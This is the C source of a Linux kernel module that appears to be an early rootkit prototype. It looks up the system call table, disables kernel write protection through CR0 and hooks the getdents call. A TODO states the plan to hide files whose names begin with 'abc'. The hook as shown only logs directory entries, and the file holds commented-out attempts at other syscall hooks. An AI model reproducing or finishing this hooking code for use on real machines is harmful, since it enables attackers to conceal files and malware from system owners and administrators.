#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <asm/cacheflush.h>
#include <asm/pgtable_types.h>
//#include<syscall_table_32.S>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <asm/special_insns.h>

#define PREFIX "abc"
#define PREFIX_SIZE (sizeof(PREFIX) - 1)

struct dirent_{
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		d_name[256]; // the struct value is actually longer than this, and d_name is variable width.
};

static unsigned long **p_sys_call_table;
/* Aquire system calls table address */
unsigned long original_cr0;

#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)

MODULE_LICENSE("GPL");

unsigned long *syscall_table = (void *)0xffffffff81e001a0;


asmlinkage int (*original_getdents) (unsigned int, struct dirent_ __user *, unsigned int);

asmlinkage int custom_getdents(unsigned int fd, struct dirent_ __user *entries, unsigned int count) {
	
	char check[5] = "abc";
	struct dirent_ *dEntryPtr;
	dEntryPtr = entries;
	int i;
	long bytes_read;
	bytes_read = original_getdents(fd, entries, count);
	
	char* dbuf;
	dbuf = (char*) entries;
	int boff;
	
	for(boff = 0; boff < bytes_read;){
		dEntryPtr = (struct dirent_*) (dbuf + boff);
		//if((strstr(dEntryPtr->d_name, check) != NULL)){
			printk(KERN_ALERT "Count: %d\n", count);
			printk(KERN_ALERT "File: %s\n", dEntryPtr->d_name);
		//}
		boff += dEntryPtr->d_reclen;
	}
	
	// TODO: identify abc prefix entries, remove them from entries by shifting following entries and adjusting bytes read

	return bytes_read;	
}

int make_rw(unsigned long *address) {
	printk(KERN_ALERT "Ho ho\n");
	unsigned int level;
	pte_t *pte;
	printk(KERN_ALERT "Inside make_rw\n");
	printk(KERN_ALERT "Address %p\n", (void *) address);
	pte = lookup_address(*address, &level);
	if(NULL == pte) {
		printk(KERN_ALERT "Why is Pte null?\n");
	}
	printk(KERN_ALERT "Before\n"); 
	if(pte -> pte &~ _PAGE_RW) {
		printk(KERN_ALERT "Inside the if\n");
		pte -> pte |= _PAGE_RW;
	}
	printk(KERN_ALERT "Came out\n"); 
	return 0;

	/*struct page *pg;
        pgprot_t prot;
        pg = virt_to_page(address);
        prot.pgprot = VM_READ | VM_WRITE;
	printk(KERN_ALERT "Woohoo %d", change_page_attr(pg, 1, prot));
        return change_page_attr(pg, 1, prot);
	*/
}

/* Make the page write protected */ 
int make_ro(unsigned long *address) {
	unsigned int level;
	pte_t *pte;
	printk(KERN_ALERT "Inside make_ro\n");
	pte = lookup_address(*address, &level); 
	pte->pte = pte->pte &~ _PAGE_RW;
	return 0;
}

/*
int set_page_rw(long unsigned int _addr)
{
   struct page *pg;
   pgprot_t prot;
   pg = virt_to_page(_addr);
   prot.pgprot = VM_READ | VM_WRITE;
   return change_page_attr(pg, 1, prot);
}*/

__init int init_module()
{
    // sys_call_table address in System.map
    //sys_call_table = (unsigned long *)ffffffff81e001a0;
    printk(KERN_ALERT "Entering the init_module with the address %p\n", (void *) syscall_table);
    printk(KERN_ALERT "Next: %p\n", syscall_table);

    p_sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
    if(NULL != p_sys_call_table) {
    	printk(KERN_ALERT "Yay! The address is %p\n", *p_sys_call_table);
    }

    /*make_rw((unsigned long *)p_sys_call_table);
    

   * original_sys_exit=(void*)*(sys_call_table + __NR_exit); 
    *(p_sys_call_table + __NR_exit) = (unsigned long)our_fake_exit_function;

    original_call = (void *) (*(p_sys_call_table) + __NR_exit);
    printk(KERN_ALERT "Original call success");

    *(p_sys_call_table + __NR_exit) = (unsigned long *) our_sys_open;

    *printk(KERN_ALERT "Make rw success");
    original_call = (void *)  p_sys_call_table[__NR_read];
    printk(KERN_ALERT "Original call success");
    printk(KERN_ALERT "Nr open %d", __NR_read);
    // printk(KERN_ALERT "Address: %p", p_sys_call_table + __NR_open);
    p_sys_call_table[__NR_read] = (void *) our_sys_open;
    printk(KERN_ALERT "Unable to access syscall_table");
    make_ro((unsigned long *) p_sys_call_table);
    printk(KERN_ALERT "Exit the init_module");*/
 
    original_cr0 = read_cr0();
    write_cr0(original_cr0 & ~0x00010000);
    //Get the number from /usr/include/asm/unistd_64.h
    original_getdents = (void *)p_sys_call_table[__NR_getdents];

    // we now overwrite the syscall
    p_sys_call_table[__NR_getdents] = (unsigned long *) custom_getdents;
    write_cr0(original_cr0);
    printk(KERN_ALERT "Patched! syscall number : %d\n", __NR_getdents);

    return 0;
}

void cleanup_module()
{
   /* Restore the original call
   make_rw((unsigned long *) p_sys_call_table);
   p_sys_call_table[__NR_read] = (unsigned long *) original_call;
   make_ro((unsigned long *) p_sys_call_table);*/

   if (p_sys_call_table != NULL) {
   	original_cr0 = read_cr0();
    	write_cr0(original_cr0 & ~0x00010000);

    	p_sys_call_table[__NR_getdents] = (unsigned long *)original_getdents;

    	write_cr0(original_cr0);
   }
}

